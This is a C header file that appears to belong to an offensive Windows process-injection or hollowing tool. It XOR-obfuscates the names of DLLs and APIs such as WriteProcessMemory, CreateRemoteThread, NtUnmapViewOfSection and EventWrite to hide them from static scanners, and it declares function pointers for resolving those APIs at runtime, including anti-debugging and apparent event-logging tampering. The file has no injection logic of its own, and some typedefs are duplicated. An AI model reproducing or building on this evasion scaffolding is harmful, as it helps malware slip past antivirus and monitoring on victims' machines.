#include <Windows.h>
#include <Psapi.h> 
#include <winternl.h>
#include <Evntprov.h>

// CHANGE THIS
#define XKY 0x5A

// psapi
//const char* papdl = "psapi.dll";
//const char* pEnProc = "EnumProcesses";
//const char* pEnProcMod = "EnumProcessModules";
//const char* pGModFname = "GetModuleFileNameExA";
// 

char papdl[] = { 'p' ^ XKY, 's' ^ XKY, 'a' ^ XKY, 'p' ^ XKY, 'i' ^ XKY, '.' ^ XKY, 'd' ^ XKY, 'l' ^ XKY, 'l' ^ XKY, '\0' };
char pEnProc[] = { 'E' ^ XKY, 'n' ^ XKY, 'u' ^ XKY, 'm' ^ XKY, 'P' ^ XKY, 'r' ^ XKY, 'o' ^ XKY, 'c' ^ XKY, 'e' ^ XKY, 's' ^ XKY, 's' ^ XKY, 'e' ^ XKY, 's' ^ XKY, '\0' };
char pEnProcMod[] = { 'E' ^ XKY, 'n' ^ XKY, 'u' ^ XKY, 'm' ^ XKY, 'P' ^ XKY, 'r' ^ XKY, 'o' ^ XKY, 'c' ^ XKY, 'e' ^ XKY, 's' ^ XKY, 's' ^ XKY, 'M' ^ XKY, 'o' ^ XKY, 'd' ^ XKY, 'u' ^ XKY, 'l' ^ XKY, 'e' ^ XKY, 's' ^ XKY, '\0' };
char pGModFname[] = { 'G' ^ XKY, 'e' ^ XKY, 't' ^ XKY, 'M' ^ XKY, 'o' ^ XKY, 'd' ^ XKY, 'u' ^ XKY, 'l' ^ XKY, 'e' ^ XKY, 'F' ^ XKY, 'i' ^ XKY, 'l' ^ XKY, 'e' ^ XKY, 'N' ^ XKY, 'a' ^ XKY, 'm' ^ XKY, 'e' ^ XKY, 'E' ^ XKY, 'x' ^ XKY, 'A' ^ XKY, '\0' };

/*
// kernel32
const char* k32dl = "kernel32.dll";
const char* kOpProc = "OpenProcess";
const char* kChand = "CloseHandle";
const char* kGLErr = "GetLastError";
const char* kVAlEx = "VirtualAllocEx";
const char* kWpm = "WriteProcessMemory";
const char* kVFrEx = "VirtualFreeEx";
const char* kCrRemThr = "CreateRemoteThread";
const char* kWSingObj = "WaitForSingleObject";
const char* kCrPrA = "CreateProcessA";
const char* kTermPr = "TerminateProcess";
const char* kResThr = "ResumeThread";
const char* kDbgPres = "IsDebuggerPresent";
const char* kFlInstrC = "FlushInstructionCache";
*/

// Kernel32
char k32dl[] = { 'k' ^ XKY, 'e' ^ XKY, 'r' ^ XKY, 'n' ^ XKY, 'e' ^ XKY, 'l' ^ XKY, '3' ^ XKY, '2' ^ XKY, '.' ^ XKY, 'd' ^ XKY, 'l' ^ XKY, 'l' ^ XKY, '\0' };
char kOpProc[] = { 'O' ^ XKY, 'p' ^ XKY, 'e' ^ XKY, 'n' ^ XKY, 'P' ^ XKY, 'r' ^ XKY, 'o' ^ XKY, 'c' ^ XKY, 'e' ^ XKY, 's' ^ XKY, 's' ^ XKY, '\0' };
char kChand[] = { 'C' ^ XKY, 'l' ^ XKY, 'o' ^ XKY, 's' ^ XKY, 'e' ^ XKY, 'H' ^ XKY, 'a' ^ XKY, 'n' ^ XKY, 'd' ^ XKY, 'l' ^ XKY, 'e' ^ XKY, '\0' };
char kGLErr[] = { 'G' ^ XKY, 'e' ^ XKY, 't' ^ XKY, 'L' ^ XKY, 'a' ^ XKY, 's' ^ XKY, 't' ^ XKY, 'E' ^ XKY, 'r' ^ XKY, 'r' ^ XKY, 'o' ^ XKY, 'r' ^ XKY, '\0' };
char kVAlEx[] = { 'V' ^ XKY, 'i' ^ XKY, 'r' ^ XKY, 't' ^ XKY, 'u' ^ XKY, 'a' ^ XKY, 'l' ^ XKY, 'A' ^ XKY, 'l' ^ XKY, 'l' ^ XKY, 'o' ^ XKY, 'c' ^ XKY, 'E' ^ XKY, 'x' ^ XKY, '\0' };
char kWpm[] = { 'W' ^ XKY, 'r' ^ XKY, 'i' ^ XKY, 't' ^ XKY, 'e' ^ XKY, 'P' ^ XKY, 'r' ^ XKY, 'o' ^ XKY, 'c' ^ XKY, 'e' ^ XKY, 's' ^ XKY, 's' ^ XKY, 'M' ^ XKY, 'e' ^ XKY, 'm' ^ XKY, 'o' ^ XKY, 'r' ^ XKY, 'y' ^ XKY, '\0' };
char kVFrEx[] = { 'V' ^ XKY, 'i' ^ XKY, 'r' ^ XKY, 't' ^ XKY, 'u' ^ XKY, 'a' ^ XKY, 'l' ^ XKY, 'F' ^ XKY, 'r' ^ XKY, 'e' ^ XKY, 'e' ^ XKY, 'E' ^ XKY, 'x' ^ XKY, '\0' };
char kCrRemThr[] = { 'C' ^ XKY, 'r' ^ XKY, 'e' ^ XKY, 'a' ^ XKY, 't' ^ XKY, 'e' ^ XKY, 'R' ^ XKY, 'e' ^ XKY, 'm' ^ XKY, 'o' ^ XKY, 't' ^ XKY, 'e' ^ XKY, 'T' ^ XKY, 'h' ^ XKY, 'r' ^ XKY, 'e' ^ XKY, 'a' ^ XKY, 'd' ^ XKY, '\0' };
char kWSingObj[] = { 'W' ^ XKY, 'a' ^ XKY, 'i' ^ XKY, 't' ^ XKY, 'F' ^ XKY, 'o' ^ XKY, 'r' ^ XKY, 'S' ^ XKY, 'i' ^ XKY, 'n' ^ XKY, 'g' ^ XKY, 'l' ^ XKY, 'e' ^ XKY, 'O' ^ XKY, 'b' ^ XKY, 'j' ^ XKY, 'e' ^ XKY, 'c' ^ XKY, 't' ^ XKY, '\0' };
char kCrPrA[] = { 'C' ^ XKY, 'r' ^ XKY, 'e' ^ XKY, 'a' ^ XKY, 't' ^ XKY, 'e' ^ XKY, 'P' ^ XKY, 'r' ^ XKY, 'o' ^ XKY, 'c' ^ XKY, 'e' ^ XKY, 's' ^ XKY, 's' ^ XKY, 'A' ^ XKY, '\0' };
char kTermPr[] = { 'T' ^ XKY, 'e' ^ XKY, 'r' ^ XKY, 'm' ^ XKY, 'i' ^ XKY, 'n' ^ XKY, 'a' ^ XKY, 't' ^ XKY, 'e' ^ XKY, 'P' ^ XKY, 'r' ^ XKY, 'o' ^ XKY, 'c' ^ XKY, 'e' ^ XKY, 's' ^ XKY, 's' ^ XKY, '\0' };
char kResThr[] = { 'R' ^ XKY, 'e' ^ XKY, 's' ^ XKY, 'u' ^ XKY, 'm' ^ XKY, 'e' ^ XKY, 'T' ^ XKY, 'h' ^ XKY, 'r' ^ XKY, 'e' ^ XKY, 'a' ^ XKY, 'd' ^ XKY, '\0' };
char kDbgPres[] = { 'I' ^ XKY, 's' ^ XKY, 'D' ^ XKY, 'e' ^ XKY, 'b' ^ XKY, 'u' ^ XKY, 'g' ^ XKY, 'g' ^ XKY, 'e' ^ XKY, 'r' ^ XKY, 'P' ^ XKY, 'r' ^ XKY, 'e' ^ XKY, 's' ^ XKY, 'e' ^ XKY, 'n' ^ XKY, 't' ^ XKY, '\0' };
char kFlInstrC[] = { 'F' ^ XKY, 'l' ^ XKY, 'u' ^ XKY, 's' ^ XKY, 'h' ^ XKY, 'I' ^ XKY, 'n' ^ XKY, 's' ^ XKY, 't' ^ XKY, 'r' ^ XKY, 'u' ^ XKY, 'c' ^ XKY, 't' ^ XKY, 'i' ^ XKY, 'o' ^ XKY, 'n' ^ XKY, 'C' ^ XKY, 'a' ^ XKY, 'c' ^ XKY, 'h' ^ XKY, 'e' ^ XKY, '\0' };

/*
// ntdll
const char* ntdl = "ntdll.dll";
const char* nNqip = "NtQueryInformationProcess";
const char* nUnMvs = "NtUnmapViewOfSection";
const char* nProcVmem = "NtProtectVirtualMemory";
const char* nWrVMem = "NtWriteVirtualMemory";
*/

// NTDLL
char ntdl[] = { 'n' ^ XKY, 't' ^ XKY, 'd' ^ XKY, 'l' ^ XKY, 'l' ^ XKY, '.' ^ XKY, 'd' ^ XKY, 'l' ^ XKY, 'l' ^ XKY, '\0' };
char nNqip[] = { 'N' ^ XKY, 't' ^ XKY, 'Q' ^ XKY, 'u' ^ XKY, 'e' ^ XKY, 'r' ^ XKY, 'y' ^ XKY, 'I' ^ XKY, 'n' ^ XKY, 'f' ^ XKY, 'o' ^ XKY, 'r' ^ XKY, 'm' ^ XKY, 'a' ^ XKY, 't' ^ XKY, 'i' ^ XKY, 'o' ^ XKY, 'n' ^ XKY, 'P' ^ XKY, 'r' ^ XKY, 'o' ^ XKY, 'c' ^ XKY, 'e' ^ XKY, 's' ^ XKY, 's' ^ XKY, '\0' };
char nUnMvs[] = { 'N' ^ XKY, 't' ^ XKY, 'U' ^ XKY, 'n' ^ XKY, 'm' ^ XKY, 'a' ^ XKY, 'p' ^ XKY, 'V' ^ XKY, 'i' ^ XKY, 'e' ^ XKY, 'w' ^ XKY, 'O' ^ XKY, 'f' ^ XKY, 'S' ^ XKY, 'e' ^ XKY, 'c' ^ XKY, 't' ^ XKY, 'i' ^ XKY, 'o' ^ XKY, 'n' ^ XKY, '\0' };
char nProcVmem[] = { 'N' ^ XKY, 't' ^ XKY, 'P' ^ XKY, 'r' ^ XKY, 'o' ^ XKY, 't' ^ XKY, 'e' ^ XKY, 'c' ^ XKY, 't' ^ XKY, 'V' ^ XKY, 'i' ^ XKY, 'r' ^ XKY, 't' ^ XKY, 'u' ^ XKY, 'a' ^ XKY, 'l' ^ XKY, 'M' ^ XKY, 'e' ^ XKY, 'm' ^ XKY, 'o' ^ XKY, 'r' ^ XKY, 'y' ^ XKY, '\0' };
char nWrVMem[] = { 'N' ^ XKY, 't' ^ XKY, 'W' ^ XKY, 'r' ^ XKY, 'i' ^ XKY, 't' ^ XKY, 'e' ^ XKY, 'V' ^ XKY, 'i' ^ XKY, 'r' ^ XKY, 't' ^ XKY, 'u' ^ XKY, 'a' ^ XKY, 'l' ^ XKY, 'M' ^ XKY, 'e' ^ XKY, 'm' ^ XKY, 'o' ^ XKY, 'r' ^ XKY, 'y' ^ XKY, '\0' };

// advapi32
//const char* adv32dl = "advapi32.dll";
//const char* aEvtWr = "EventWrite";

// ADVAPI32
char adv32dl[] = { 'a' ^ XKY, 'd' ^ XKY, 'v' ^ XKY, 'a' ^ XKY, 'p' ^ XKY, 'i' ^ XKY, '3' ^ XKY, '2' ^ XKY, '.' ^ XKY, 'd' ^ XKY, 'l' ^ XKY, 'l' ^ XKY, '\0' };
char aEvtWr[] = { 'E' ^ XKY, 'v' ^ XKY, 'e' ^ XKY, 'n' ^ XKY, 't' ^ XKY, 'W' ^ XKY, 'r' ^ XKY, 'i' ^ XKY, 't' ^ XKY, 'e' ^ XKY, '\0' };

#pragma once
// Define NT API function prototypes
// Kernel32 prototypes
typedef BOOL(__stdcall* pCreateProcessA)(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );

typedef HANDLE(__stdcall* pOpenProcess)(
    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId
    );

typedef BOOL(__stdcall* pCloseHandle)(
    HANDLE hObject
    );

typedef BOOL(__stdcall* pWriteProcessMemory)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten
    );

typedef LPVOID(__stdcall* pVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
    );

typedef BOOL(__stdcall* pVirtualFreeEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD dwFreeType
    );

typedef DWORD(__stdcall* pGetLastError)(
    void
    );

typedef BOOL(__stdcall* pEnumProcesses)(
    DWORD* lpidProcess,
    DWORD cb,
    DWORD* lpcbNeeded
    );

typedef BOOL(__stdcall* pEnumProcessModules)(
    HANDLE hProcess,
    HMODULE* lphModule,
    DWORD cb,
    LPDWORD lpcbNeeded
    );

typedef DWORD(__stdcall* pGetModuleFileNameExA)(
    HANDLE hProcess,
    HMODULE hModule,
    LPSTR lpFilename,
    DWORD nSize
    );

typedef DWORD(__stdcall* pResumeThread)(
    HANDLE hThread
    );

typedef BOOL(__stdcall* pTerminateProcess)(
    HANDLE hProcess,
    UINT uExitCode
    );

typedef HANDLE(__stdcall* pCreateRemoteThread)(
    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
    );

typedef DWORD(__stdcall* pWaitForSingleObject)(
    HANDLE hHandle,
    DWORD dwMilliseconds
    );

typedef BOOL(__stdcall* pIsDebuggerPresent)(
    void
    );

typedef BOOL(__stdcall* pFlushInstrucionCache)(
    HANDLE hProcess,
    LPCVOID lpBaseAddress,
    SIZE_T dwSize
    );

// Psapi
typedef BOOL(WINAPI* pEnumProcesses)(
    DWORD* lpidProcess,
    DWORD cb,
    DWORD* lpcbNeeded
    );

typedef BOOL(WINAPI* pEnumProcessModules)(
    HANDLE hProcess,
    HMODULE* lphModule,
    DWORD cb,
    LPDWORD lpcbNeeded
    );

typedef DWORD(WINAPI* pGetModuleFileNameExA)(
    HANDLE hProcess,
    HMODULE hModule,
    LPSTR lpFilename,
    DWORD nSize
    );

// Ntdll
typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
    );

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
    );

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartAddress,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
    );

typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

// Advapi32
typedef ULONG(WINAPI* pEventWrite)(
    REGHANDLE RegHandle,
    PCEVENT_DESCRIPTOR EventDescriptor,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData
    );